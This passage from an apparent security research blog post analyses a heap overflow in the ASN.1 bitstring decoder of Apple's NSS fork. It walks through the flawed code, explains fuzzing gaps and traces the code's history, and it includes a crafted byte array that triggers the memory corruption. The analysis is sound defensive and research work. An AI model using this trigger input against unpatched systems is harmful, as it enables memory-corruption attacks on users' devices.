 <p class="c6"><span class="c3">&nbsp; state</span><span class="c1">-&gt;</span><span class="c3">place </span><span class="c1">=</span><span class="c3">&nbsp;afterEndOfContents</span><span class="c1">;</span></p></td></tr></tbody></table>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>Here they&#39;re detecting a definite-length string type with a content length of 0. But this doesn&#39;t handle the edge case of a bitstring which consists only of the unused-bits count byte. The </span><span class="c7">state-&gt;contents_length</span><span class="c9">&nbsp;value of that bitstring will be 1, but it doesn&#39;t actually have any &quot;contents&quot;. </span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>It&#39;s this case which the </span><span class="c7">(state-&gt;contents_length == 1)</span><span>&nbsp;conditional in </span><span class="c7">sec_asn1d_parse_bit_string</span><span class="c9">&nbsp;matches:</span></p>
 <p class="c0 c15"><span class="c9"></span></p><a id="t.cc85cec956c682ae2159b3e2792de03dfdc37f3c"></a><a id="t.13"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">((</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">pending </span><span class="c1">==</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">||</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">contents_length </span><span class="c1">==</span><span class="c3">&nbsp;</span><span class="c11">1</span><span class="c1">))</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">dest </span><span class="c1">!=</span><span class="c3">&nbsp;NULL</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c20">SecAsn1Item</span><span class="c3">&nbsp;</span><span class="c1">*</span><span class="c3">item </span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c20">SecAsn1Item</span><span class="c3">&nbsp;</span><span class="c1">*)(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">dest</span><span class="c1">);</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; item</span><span class="c1">-&gt;</span><span class="c20">Data</span><span class="c3">&nbsp;</span><span class="c1">=</span><span class="c3">&nbsp;NULL</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; item</span><span class="c1">-&gt;</span><span class="c20">Length</span><span class="c3">&nbsp;</span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">place </span><span class="c1">=</span><span class="c3">&nbsp;beforeEndOfContents</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c1">}</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16">if</span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">contents_length </span><span class="c1">==</span><span class="c3">&nbsp;</span><span class="c11">1</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c23">/* skip over (unused) remainder byte */</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16">return</span><span class="c3">&nbsp;</span><span class="c11">1</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c1">}</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16">else</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16">return</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c1">}</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c1">}</span></p></td></tr></tbody></table>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>By setting </span><span class="c7">state-&gt;place</span><span>&nbsp;to </span><span class="c7">beforeEndOfContents</span><span>&nbsp;they are again trying to short-circuit the state machine to skip ahead to the state after the string contents have been consumed. But here they take an additional step which they didn&#39;t take when trying to achieve exactly the same thing in </span><span class="c7">prepareForContents</span><span>. In addition to updating </span><span class="c7">state-&gt;place</span><span>&nbsp;they also </span><span class="c7">NULL</span><span>&nbsp;out the </span><span class="c7">dest</span><span>&nbsp;</span><span class="c7">SecAsn1Item</span><span>&#39;s </span><span class="c7">Data</span><span>&nbsp;field and set the </span><span class="c7">Length</span><span>&nbsp;to </span><span class="c7">0</span><span class="c9">.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>I mentioned earlier that the new child states which are allocated to recursively parse the sub-strings of constructed strings get a </span><span class="c17">copy</span><span>&nbsp;of the parent&#39;s dest field (which is a pointer to a pointer to the output buffer.) This makes sense: that output buffer is only allocated once then gets recursively filled-in in a linear fashion by the children. (Technically this isn&#39;t actually how it works if the outermost string is indefinite length, there&#39;s separate handling for that case which instead builds a linked-list of substrings which are eventually concatenated, see </span><span class="c7">sec_asn1d_concat_substrings</span><span class="c9">.)</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>If the output buffer is only allocated once, what happens if you set </span><span class="c7">Data</span><span>&nbsp;to </span><span class="c7">NULL</span><span class="c9">&nbsp;like they do here? Taking a step back, does that actually make any sense at all?</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>No, I don&#39;t think it makes any sense. Setting </span><span class="c7">Data</span><span>&nbsp;to </span><span class="c7">NULL</span><span class="c9">&nbsp;at this point should at the very least cause a memory leak, as it&#39;s the only pointer to the output buffer.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>The fun part though is that that&#39;s not the only consequence of </span><span class="c7">NULL</span><span>ing out that pointer. </span><span class="c7">item-&gt;Data</span><span class="c9">&nbsp;is used to signal something else.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>Here&#39;s a snippet from </span><span class="c7">prepare_for_contents</span><span class="c9">&nbsp;when it&#39;s determining whether there&#39;s enough space in the output buffer for this substring</span></p>
 <p class="c0 c15"><span class="c9"></span></p><a id="t.d41f98cf14153779bd60c5cf6b4f85e93e5bdb90"></a><a id="t.14"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c1">}</span><span class="c3">&nbsp;</span><span class="c16">else</span><span class="c3">&nbsp;</span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">substring</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; </span><span class="c23">/*</span></p>
 <p class="c6"><span class="c23">&nbsp; &nbsp;* If we are a substring of a constructed string, then we may</span></p>
 <p class="c6"><span class="c23">&nbsp; &nbsp;* not have to allocate anything (because our parent, the</span></p>
 <p class="c6"><span class="c23">&nbsp; &nbsp;* actual constructed string, did it for us). &nbsp;If we are a</span></p>
 <p class="c6"><span class="c23">&nbsp; &nbsp;* substring and we *do* have to allocate, that means our</span></p>
 <p class="c6"><span class="c23">&nbsp; &nbsp;* parent is an indefinite-length, so we allocate from our pool;</span></p>
 <p class="c6"><span class="c23">&nbsp; &nbsp;* later our parent will copy our string into the aggregated</span></p>
 <p class="c6"><span class="c23">&nbsp; &nbsp;* whole and free our pool allocation.</span></p>
 <p class="c6"><span class="c23">&nbsp; &nbsp;*/</span></p>
 <p class="c6"><span class="c3">&nbsp; </span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c3">item</span><span class="c1">-&gt;</span><span class="c20">Data</span><span class="c3">&nbsp;</span><span class="c1">==</span><span class="c3">&nbsp;NULL</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; PORT_Assert </span><span class="c1">(</span><span class="c3">item</span><span class="c1">-&gt;</span><span class="c20">Length</span><span class="c3">&nbsp;</span><span class="c1">==</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">);</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; poolp </span><span class="c1">=</span><span class="c3">&nbsp;state</span><span class="c1">-&gt;</span><span class="c3">top</span><span class="c1">-&gt;</span><span class="c3">our_pool</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; </span><span class="c1">}</span><span class="c3">&nbsp;</span><span class="c16">else</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; alloc_len </span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; </span><span class="c1">}</span></p></td></tr></tbody></table>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>As the comment implies, if both </span><span class="c7">item-&gt;Data</span><span>&nbsp;is </span><span class="c7">NULL</span><span>&nbsp;at this point and </span><span class="c7">state-&gt;substring</span><span>&nbsp;is true, then (they believe) it </span><span class="c17">must</span><span>&nbsp;be the case that they are currently parsing a substring of an outer-level indefinite string, which has no definite-sized buffer already allocated. In that case the meaning of the </span><span class="c30">item-&gt;Data</span><span>&nbsp;pointer is different to that which we describe earlier: it&#39;s merely a temporary buffer meant to hold only this substring. Just above here </span><span class="c7">alloc_len</span><span>&nbsp;was set to the content length of this substring; and for the outer-</span><span class="c17">definite</span><span>-length case it&#39;s vitally important that </span><span class="c7">alloc_len</span><span>&nbsp;then gets set to 0 here (which is really indicating that a buffer has </span><span class="c17">already</span><span>&nbsp;been allocated and they </span><span class="c17">must not</span><span class="c9">&nbsp;allocate a new one.)</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>To emphasize the potentially subtle point: the issue is that using this conjunction (</span><span class="c30">state-&gt;substring &amp;&amp; !item-&gt;Data</span><span>) for determining whether this a substring of a definite length or outer-level-indefinite string is </span><span class="c17">not</span><span class="c9">&nbsp;the same as the method used by the convoluted bounds checking code we saw earlier. That method walks up the current state stack and checks the indefinite bits of the super-strings to determine whether they&#39;re processing a substring of an outer-level-indefinite string.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span class="c9">Putting that all together, you might be able to see where this is going... (but it is still pretty subtle.)</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span class="c9">Assume that we have an outer definite-length constructed bitstring with three primitive bitstrings as substrings:</span></p>
 <p class="c6 c8 c15"></p>
 <p class="c6 c8 c15"><span class="c9"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrOQ03pJyD_2kyYzOGet_H7mP9Lt9Q297bOTvQ_nuYVxzItU8QoydNBJKi9CS537QEi5dSLjoK_y7rEw-VouOmd52e30UMUqgMCQWA06maNKRshSqr2eyyaIHqtfy-okXJy2qxcsiBuNvNO8FXGCHXSwjAzEWl5esvG0N8ObbRPK3eIOam7z3WMQMG/s831/image5%20%281%29%281%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrOQ03pJyD_2kyYzOGet_H7mP9Lt9Q297bOTvQ_nuYVxzItU8QoydNBJKi9CS537QEi5dSLjoK_y7rEw-VouOmd52e30UMUqgMCQWA06maNKRshSqr2eyyaIHqtfy-okXJy2qxcsiBuNvNO8FXGCHXSwjAzEWl5esvG0N8ObbRPK3eIOam7z3WMQMG/s831/image5%20%281%29%281%29.png" border="0" alt="" style="max-height: 750; max-width: 600px; "title="" /></a></span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>Upon encountering the first outer-most definite length constructed bitstring, the code will allocate a fixed-size buffer, large enough to store all the remaining input which makes up this string, which in this case is 42 bytes. At this point </span><span class="c7">dest-&gt;Data</span><span class="c9">&nbsp;points to that buffer.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>They then allocate a child state, which gets a copy of the </span><span class="c7">dest</span><span>&nbsp;pointer (not a copy of the </span><span class="c7">dest</span><span>&nbsp;</span><span class="c7">SecAsn1Item</span><span>&nbsp;object; a copy of a pointer </span><span class="c26">to</span><span class="c9">&nbsp;it), and proceed to parse the first child substring.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>This is a primitive bitstring with a length of </span><span class="c7">1</span><span>&nbsp;which triggers the vulnerable path in </span><span class="c7">sec_asn1d_parse_bit_string</span><span>&nbsp;and sets </span><span class="c7">dest-&gt;Data</span><span>&nbsp;to </span><span class="c7">NULL</span><span>. The state machine skips ahead to </span><span class="c7">beforeEndOfContents</span><span>&nbsp;then eventually the next substring gets parsed - this time with </span><span class="c7">dest-&gt;Data == NULL</span><span class="c9">.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>Now the logic goes wrong in a bad way and, as we saw in the snippet above, a new </span><span class="c7">dest-&gt;Data</span><span>&nbsp;buffer gets allocated which is the size of only this substring (2 bytes) when in fact </span><span class="c7">dest-&gt;Data</span><span class="c9">&nbsp;should already point to a buffer large enough to hold the entire outer-level-indefinite input string. This bitstring&#39;s contents then get parsed and copied into that buffer.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>Now we come to the third substring. </span><span class="c7">dest-&gt;Data</span><span>&nbsp;is no longer </span><span class="c7">NULL</span><span>; but the code now has no way of determining that the buffer was in fact only (erroneously) allocated to hold a single substring. It believes the invariant that </span><span class="c7">item-&gt;Data</span><span>&nbsp;only gets allocated </span><span class="c17">once</span><span>, when the first outer-level definite length string is encountered, and it&#39;s that fact alone which it uses to determine whether </span><span class="c7">dest-&gt;Data</span><span class="c9">&nbsp;points to a buffer large enough to have this substring appended to it. It then happily appends this third substring, writing outside the bounds of the buffer allocated to store only the second substring.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span class="c19 c17 c28">This gives you a great memory corruption primitive: you can cause allocations of a controlled size and then overflow them with an arbitrary number of arbitrary bytes.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span class="c9">Here&#39;s an example encoding for an ASN.1 bitstring which triggers this issue:</span></p>
 <p class="c0 c15"><span class="c9"></span></p><a id="t.1261584b92e8184a2715fd7e3223a95479b2f4e0"></a><a id="t.15"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c3">&nbsp; &nbsp;uint8_t concat_bitstrings_constructed_definite_with_zero_len_realloc</span><span class="c1">[]</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c1">{</span><span class="c3">ASN1_CLASS_UNIVERSAL </span><span class="c1">|</span><span class="c3">&nbsp;ASN1_CONSTRUCTED </span><span class="c1">|</span><span class="c3">&nbsp;ASN1_BIT_STRING</span><span class="c1">,</span><span class="c3">&nbsp;</span><span class="c23">// (0x23)</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">0x4a</span><span class="c1">,</span><span class="c3">&nbsp;</span><span class="c23">// initial allocation size</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ASN1_CLASS_UNIVERSAL </span><span class="c1">|</span><span class="c3">&nbsp;ASN1_PRIMITIVE </span><span class="c1">|</span><span class="c3">&nbsp;ASN1_BIT_STRING</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">0x1</span><span class="c1">,</span><span class="c3">&nbsp;</span><span class="c23">// force item-&gt;Data = NULL</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">0x0</span><span class="c1">,</span><span class="c3">&nbsp;</span><span class="c23">// number of unused bits in the final byte</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ASN1_CLASS_UNIVERSAL </span><span class="c1">|</span><span class="c3">&nbsp;ASN1_PRIMITIVE </span><span class="c1">|</span><span class="c3">&nbsp;ASN1_BIT_STRING</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">0x2</span><span class="c1">,</span><span class="c3">&nbsp;</span><span class="c23">// this is the reallocation size</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">0x0</span><span class="c1">,</span><span class="c3">&nbsp;</span><span class="c23">// number of unused bits in the final byte</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">0xff</span><span class="c1">,</span><span class="c3">&nbsp;</span><span class="c23">// only byte of bitstring</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ASN1_CLASS_UNIVERSAL </span><span class="c1">|</span><span class="c3">&nbsp;ASN1_PRIMITIVE </span><span class="c1">|</span><span class="c3">&nbsp;ASN1_BIT_STRING</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">0x41</span><span class="c1">,</span><span class="c3">&nbsp;</span><span class="c23">// 64 actual bytes, plus the remainder, will cause 0x40 byte memcpy one byte in to 2 byte allocation</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">0x0</span><span class="c1">,</span><span class="c3">&nbsp;</span><span class="c23">// number of unused bits in the final byte</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">0xff</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c11">0xff</span><span class="c1">,</span><span class="c23">// -- continues for overflow</span></p></td></tr></tbody></table><h2 class="c8 c15 c32" id="h.vxzzlpbs8x7"><span class="c31 c28">Why wasn&#39;t this found by fuzzing?</span></h2>
 <p class="c6 c8 c15"><span>This is a reasonable question to ask. This source code is really really hard to audit, even with the diff it was at least a week of work to figure out the true root cause of the bug. I&#39;m not sure if I would have spotted this issue during a code audit. It&#39;s very broken but it&#39;s quite subtle and you have to figure out a </span><span class="c17">lot</span><span class="c9">&nbsp;about the state machine and the bounds-checking rules to see it - I think I might have given up before I figured it out and gone to look for something easier.</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span class="c9">But the trigger test-case is neither structurally complex nor large, and feels within-grasp for a fuzzer. So why wasn&#39;t it found? I&#39;ll offer two points for discussion:</span></p><h3 class="c8 c15 c33" id="h.3uiruiqbxcn4"><span class="c10">Perhaps it&#39;s not being fuzzed?</span></h3>
 <p class="c6 c8 c15"><span>Or at least, it&#39;s not being fuzzed in the exact form which it appears in Apple&#39;s Security.framework library. I understand that both Mozilla and Google do fuzz the NSS ASN.1 parser and have found a bunch of vulnerabilities, but note that the key part of the vulnerable code (&quot;</span><span class="c30">|| (state-&gt;contents_length == 1&quot;</span><span>&nbsp;in </span><span class="c30">sec_asn1d_parse_bit_string</span><span class="c9">) isn&#39;t present in upstream NSS (more on that below.)</span></p><h3 class="c33 c8 c15" id="h.d8eztr5gmfv7"><span class="c10">Can it be fuzzed effectively?</span></h3>
 <p class="c6 c8 c15"><span>Even if you did build the Security.framework version of the code and used a coverage guided fuzzer, you might well not trigger any crashes. The code uses a custom heap allocator and you&#39;d have to either replace that with direct calls to the system allocator or use ASAN&#39;s custom allocator hooks. Note that </span><span class="c21"><a class="c241" href="https://searchfox.org/mozilla-central/source/nsprpub/lib/ds/plarena.h#128">upstream NSS does do that</a></span><span>, but as I </span><span>understand</span><span class="c9">&nbsp;it, Apple&#39;s fork doesn&#39;t.</span></p><h2 class="c32 c8 c15" id="h.k3orbgexvo70"><span class="c31 c28">History</span></h2>
 <p class="c6 c8 c15"><span>I&#39;m always interested in not just understanding how a vulnerability works but how it was introduced. This case is a particularly compelling example because once you understand the bug, the code construct initially looks extremely suspicious. It </span><span class="c17">only</span><span>&nbsp;exists in Apple&#39;s fork of NSS and the only impact of that change is to introduce a perfect memory corruption primitive. But let&#39;s go through the history of the code to convince ourselves that it is </span><span>much more likely that it was just an unfortunate accident:</span></p>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>The earliest reference to this code I can find is </span><span class="c21"><a class="c241" href="https://github.com/jrmuizel/mozilla-cvs-history/blob/5dea64f5a5bc55978a9f4632a5f59679572c7985/security/nss/lib/util/secasn1d.c">this, which appears to be the initial checkin in the Mozilla CVS repo on March 31, 2000</a></span><span class="c9">:</span></p>
 <p class="c0 c15"><span class="c9"></span></p><a id="t.fa2500551086942ee26203176218d93c890969af"></a><a id="t.16"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c16">static</span><span class="c3">&nbsp;</span><span class="c16">unsigned</span><span class="c3">&nbsp;</span><span class="c16">long</span></p>
 <p class="c6"><span class="c3">sec_asn1d_parse_bit_string </span><span class="c1">(</span><span class="c3">sec_asn1d_state </span><span class="c1">*</span><span class="c3">state</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16">const</span><span class="c3">&nbsp;</span><span class="c16">char</span><span class="c3">&nbsp;</span><span class="c1">*</span><span class="c3">buf</span><span class="c1">,</span><span class="c3">&nbsp;</span><span class="c16">unsigned</span><span class="c3">&nbsp;</span><span class="c16">long</span><span class="c3">&nbsp;len</span><span class="c1">)</span></p>
 <p class="c6"><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">unsigned</span><span class="c3">&nbsp;</span><span class="c16">char</span><span class="c3">&nbsp;</span><span class="c16">byte</span><span class="c1">;</span></p>
 <p class="c6 c14"><span class="c2"></span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; PORT_Assert </span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">pending </span><span class="c1">&gt;</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">);</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; PORT_Assert </span><span class="c1">(</span><span class="c3">state</span><span class="c1">-&gt;</span><span class="c3">place </span><span class="c1">==</span><span class="c3">&nbsp;beforeBitString</span><span class="c1">);</span></p>
 <p class="c6 c14"><span class="c2"></span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c3">len </span><span class="c1">==</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">top</span><span class="c1">-&gt;</span><span class="c3">status </span><span class="c1">=</span><span class="c3">&nbsp;needBytes</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16">return</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c1">}</span></p>
 <p class="c6 c14"><span class="c2"></span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">byte</span><span class="c3">&nbsp;</span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c16">unsigned</span><span class="c3">&nbsp;</span><span class="c16">char</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">*</span><span class="c3">buf</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">if</span><span class="c3">&nbsp;</span><span class="c1">(</span><span class="c16">byte</span><span class="c3">&nbsp;</span><span class="c1">&gt;</span><span class="c3">&nbsp;</span><span class="c11">7</span><span class="c1">)</span><span class="c3">&nbsp;</span><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; PORT_SetError </span><span class="c1">(</span><span class="c3">SEC_ERROR_BAD_DER</span><span class="c1">);</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">top</span><span class="c1">-&gt;</span><span class="c3">status </span><span class="c1">=</span><span class="c3">&nbsp;decodeError</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16">return</span><span class="c3">&nbsp;</span><span class="c11">0</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c1">}</span></p>
 <p class="c6 c14"><span class="c2"></span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">bit_string_unused_bits </span><span class="c1">=</span><span class="c3">&nbsp;</span><span class="c16">byte</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">place </span><span class="c1">=</span><span class="c3">&nbsp;duringBitString</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; state</span><span class="c1">-&gt;</span><span class="c3">pending </span><span class="c1">-=</span><span class="c3">&nbsp;</span><span class="c11">1</span><span class="c1">;</span></p>
 <p class="c6 c14"><span class="c2"></span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">return</span><span class="c3">&nbsp;</span><span class="c11">1</span><span class="c1">;</span></p>
 <p class="c6"><span class="c1">}</span></p></td></tr></tbody></table>
 <p class="c0 c15"><span class="c9"></span></p>
 <p class="c6 c8 c15"><span>On August 24th, 2001 the form of the code changed to something like the current version, </span><span class="c21"><a class="c241" href="https://github.com/jrmuizel/mozilla-cvs-history/commit/4f4edc3a5054512a54fda651497d1dafe77f7656">in </a></span><span class="c21"><a class="c241" href="https://github.com/jrmuizel/mozilla-cvs-history/commit/4f4edc3a5054512a54fda651497d1dafe77f7656">this commit</a></span><span class="c21"><a class="c241" href="https://github.com/jrmuizel/mozilla-cvs-history/commit/4f4edc3a5054512a54fda651497d1dafe77f7656">&nbsp;with the message &quot;Memory leak fixes.&quot;</a></span><span class="c9">:</span></p>
 <p class="c0 c15"><span class="c9"></span></p><a id="t.0b11f6358ac77c720b0e948095a2bc43c83ffaf3"></a><a id="t.17"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c16">static</span><span class="c3">&nbsp;</span><span class="c16">unsigned</span><span class="c3">&nbsp;</span><span class="c16">long</span></p>
 <p class="c6"><span class="c3">sec_asn1d_parse_bit_string </span><span class="c1">(</span><span class="c3">sec_asn1d_state </span><span class="c1">*</span><span class="c3">state</span><span class="c1">,</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c16">const</span><span class="c3">&nbsp;</span><span class="c16">char</span><span class="c3">&nbsp;</span><span class="c1">*</span><span class="c3">buf</span><span class="c1">,</span><span class="c3">&nbsp;</span><span class="c16">unsigned</span><span class="c3">&nbsp;</span><span class="c16">long</span><span class="c3">&nbsp;len</span><span class="c1">)</span></p>
 <p class="c6"><span class="c1">{</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; </span><span class="c16">unsigned</span><span class="c3">&nbsp;</span><span class="c16">char</span><span class="c3">&nbsp;</span><span class="c16">byte</span><span class="c1">;</span></p>
 <p class="c6 c14"><span class="c2"></span></p>
